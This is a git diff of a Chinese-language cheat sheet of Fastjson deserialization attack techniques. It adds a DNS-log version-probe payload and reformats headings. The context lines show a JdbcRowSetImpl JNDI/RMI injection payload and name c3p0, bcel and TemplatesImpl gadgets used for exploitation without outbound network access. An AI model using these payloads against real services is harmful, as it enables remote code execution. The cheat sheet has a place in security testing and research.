@@ -7,7 +7,14 @@ Fastjson姿势技巧集合
 
 ## 探测
 
+用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。
+fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。
 
+fastjson >1.2.43
+
+```java
+{"@type":"java.net.URL","val":"dnslog"}
+```
 
 fastjson >1.2.48
 
@@ -58,7 +65,7 @@ JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本<=6u141、7u131�
 
 
 
-JdbcRowSetImpl
+#### JdbcRowSetImpl
 
 ```java
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
@@ -66,7 +73,7 @@ JdbcRowSetImpl
 
 
 
-c3p0.JndiRefForwardingDataSource
+#### c3p0#JndiRefForwardingDataSource
 
 JdbcRowSetImpl无法成功可以一试
 
@@ -76,7 +83,7 @@ JdbcRowSetImpl无法成功可以一试
 
 
 
-bcel
+#### bcel
 
 可用于解决不出网利用。
 需要注意在Java 8u251以后，bcel类被删除。
@@ -136,7 +143,7 @@ Content-Length: 3327
 
 
 
-1.2.33 <= fastjson <= 1.2.47
+#### 1.2.33 <= fastjson <= 1.2.47
 
 ```java
 POST /json HTTP/1.1
@@ -255,7 +262,7 @@ Content-Length: 3647
 
 
 
-TemplatesImpl
+### TemplatesImpl
 
 利用条件苛刻，可用于解决不出网利用。
 
@@ -269,7 +276,7 @@ TemplatesImpl
 
 
 
-c3p0#WrapperConnectionPoolDataSource
+#### c3p0#WrapperConnectionPoolDataSource
 
 可用于解决不出网利用。
 
